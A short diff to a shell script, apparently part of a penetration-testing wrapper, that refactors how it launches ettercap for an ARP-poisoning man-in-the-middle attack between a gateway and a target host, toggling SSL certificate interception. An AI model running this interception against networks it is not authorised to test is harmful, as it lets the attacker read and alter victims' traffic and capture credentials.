@@ -72,10 +72,12 @@ f_run(){
   fi
 
   if [ $sslfakecert -eq 1 ]; then
-    ettercap -i $interface -T -q ${log} -M arp:remote ${syntax}/$gw/ ${syntax}/$target1/
+    ssl=""
   else
-    ettercap -i $interface -T -S -q ${log} -M arp:remote ${syntax}/$gw/ ${syntax}/$target1/
+    ssl="--nosslmitm"
   fi
+
+  ettercap -i $interface -T ${ssl} -q ${log} -M arp:remote ${syntax}/$gw/ ${syntax}/$target1/
 }
 
 f_banner
